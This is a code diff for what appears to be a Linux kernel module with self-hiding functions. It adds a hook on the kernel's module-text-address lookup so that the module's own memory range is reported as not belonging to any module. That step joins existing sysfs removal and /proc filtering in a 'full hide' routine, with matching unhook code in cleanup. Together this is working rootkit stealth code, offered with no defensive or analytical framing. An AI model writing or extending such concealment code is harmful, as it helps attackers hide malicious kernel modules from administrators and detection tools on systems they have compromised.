@@ -201,6 +201,50 @@ static int nvk_mod_proc_filter(struct nvk_hide_state *state,
 	return 0;
 }
 
+typedef int (*nvk_mod_addr_fn)(unsigned long addr);
+static nvk_mod_addr_fn _nvk_orig_mod_text_addr;
+static struct nvk_hook _nvk_ks_hook;
+static int _nvk_ks_hooked;
+static unsigned long _nvk_hide_mod_start;
+static unsigned long _nvk_hide_mod_end;
+
+static int _nvk_mod_text_addr_filter(unsigned long addr)
+{
+	if (addr >= _nvk_hide_mod_start && addr < _nvk_hide_mod_end)
+		return 0;
+	if (_nvk_orig_mod_text_addr)
+		return _nvk_orig_mod_text_addr(addr);
+	return 0;
+}
+
+static int nvk_mod_kallsyms_filter(struct nvk_hide_state *state,
+				   const char *module_name)
+{
+	void *target;
+
+	if (state->kallsyms_filtered) return 0;
+
+	_nvk_hide_target_name = module_name;
+
+	target = NVK_LOOKUP("is_module_text_address");
+	if (!target)
+		target = NVK_LOOKUP("__module_text_address");
+	if (!target) return -1;
+
+	unsigned char *mod_base = (unsigned char *)&__this_module;
+	_nvk_hide_mod_start = (unsigned long)mod_base;
+	_nvk_hide_mod_end = _nvk_hide_mod_start + NVK_MODULE_SIZE;
+
+	int ret = nvk_hook_install(&_nvk_ks_hook, target,
+				   (void *)_nvk_mod_text_addr_filter,
+				   (void **)&_nvk_orig_mod_text_addr);
+	if (ret) return ret;
+
+	_nvk_ks_hooked = 1;
+	state->kallsyms_filtered = 1;
+	return 0;
+}
+
 static void nvk_mod_full_hide(struct nvk_hide_state *state,
 			      struct nvk_this_module *mod,
 			      const char *module_name)
@@ -210,11 +254,19 @@ static void nvk_mod_full_hide(struct nvk_hide_state *state,
 	nvk_mod_sysfs_remove(state, mod);
 
 	nvk_mod_proc_filter(state, module_name);
+
+	nvk_mod_kallsyms_filter(state, module_name);
 }
 
 static void _nvk_hide_cleanup(struct nvk_hide_state *state,
 			      struct nvk_this_module *mod)
 {
+	if (state->kallsyms_filtered && _nvk_ks_hooked) {
+		nvk_hook_remove(&_nvk_ks_hook);
+		_nvk_ks_hooked = 0;
+		state->kallsyms_filtered = 0;
+	}
+
 	if (state->seq_show_hooked) {
 		nvk_hook_remove(&state->seq_show_hook);
 		state->seq_show_hooked = 0;
